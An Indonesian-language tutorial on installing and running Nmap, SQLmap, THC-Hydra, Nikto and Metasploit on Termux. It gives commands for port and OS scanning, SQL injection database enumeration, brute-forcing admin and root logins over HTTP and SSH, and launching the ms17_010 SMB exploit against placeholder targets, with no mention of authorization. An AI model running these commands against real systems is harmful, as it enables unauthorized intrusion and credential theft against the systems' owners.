Nmap

Deskripsi:Nmap (Network Mapper) adalah alat yang digunakan untuk memindai jaringan komputer. Alat ini dapat digunakan untuk berbagai kebutuhan, seperti memindai port dan mendeteksi layanan yang berjalan.

Cara Install: Untuk menginstal Nmap di sistem berbasis *pkg* (seperti Termux di Android), jalankan perintah berikut:

pkg install nmap

Cara Penggunaan:

  • Memindai Port Tertentu: Untuk memindai port 80 (HTTP) dan 443 (HTTPS) pada alamat IP 192.168.1.1:
    • nmap -p 80,443 192.168.1.1
  • Memindai Semua Port: Untuk memindai semua port (1-65535) pada alamat IP tertentu:
    • nmap -p- 192.168.1.1
  • Memindai dengan Deteksi Layanan dan Versi: Untuk mendeteksi layanan yang berjalan di setiap port:
    • nmap -sV 192.168.1.1
  • Memindai dengan Deteksi Sistem Operasi: Untuk mendeteksi sistem operasi yang digunakan oleh target:
    • nmap -O 192.168.1.1

Penjelasan Output: Hasil dari pemindaian akan menunjukkan nomor port, status (terbuka atau tertutup), dan layanan yang berjalan di port tersebut,jika tidak ada keamanan ataupun firewall yang melindungi pasti akan mempermudah dalam pemindaiannya dan mendapatkan hasil yang di inginkan

SQLmap

Deskripsi: SQLmap adalah alat otomatis untuk mendeteksi dan mengeksploitasi kerentanan SQL Injection pada aplikasi web.

Cara Install:

pkg install sqlmap

Cara Penggunaan:

  • Mendeteksi Kerentanan SQL Injection: Untuk memeriksa URL target yang rentan:
    • sqlmap -u "http://example.com/page.php?id=1" --batch
  • Mengekstrak Database: Untuk mengekstrak nama database dari URL rentan:
    • sqlmap -u "http://example.com/page.php?id=1" --dbs

THC-Hydra

Deskripsi: THC-Hydra adalah alat brute force untuk menguji login terhadap berbagai protokol seperti FTP, SSH, HTTP, dan lainnya.

Cara Install:

pkg install hydra

Cara Penggunaan:

  • Brute Force Login HTTP: Untuk menguji login pada situs web:
    • hydra -l admin -P /path/to/passwords.txt http://example.com -V
  • Brute Force Login SSH: Untuk menguji login SSH pada IP target:
    • hydra -l root -P /path/to/passwords.txt ssh://192.168.1.1

Nikto

Deskripsi: Nikto adalah alat pemindai server web yang digunakan untuk mendeteksi kerentanan, konfigurasi yang salah, dan masalah keamanan lainnya.

Cara Install:

pkg install nikto

Cara Penggunaan:

  • Memindai Server Web: Untuk memindai sebuah URL target:
    • nikto -h http://example.com
  • Memindai dengan Port Spesifik: Untuk memindai port tertentu, misalnya port 8080:
    • nikto -h http://example.com -p 8080

Metasploit

Deskripsi: Metasploit adalah framework pengujian penetrasi untuk menemukan, menguji, dan mengeksploitasi kerentanan.

Cara Install:


pkg install unstable-repo
pkg install metasploit

Cara Penggunaan:

  • Menjalankan Metasploit: Untuk membuka konsol Metasploit:
    • msfconsole
  • Mencari Exploit: Untuk mencari exploit berdasarkan nama:
    • search exploit windows/smb/ms17_010
  • Menjalankan Exploit: Untuk memuat dan menjalankan exploit tertentu:
    • 
use exploit/windows/smb/ms17_010
set RHOSTS 192.168.1.1
exploit
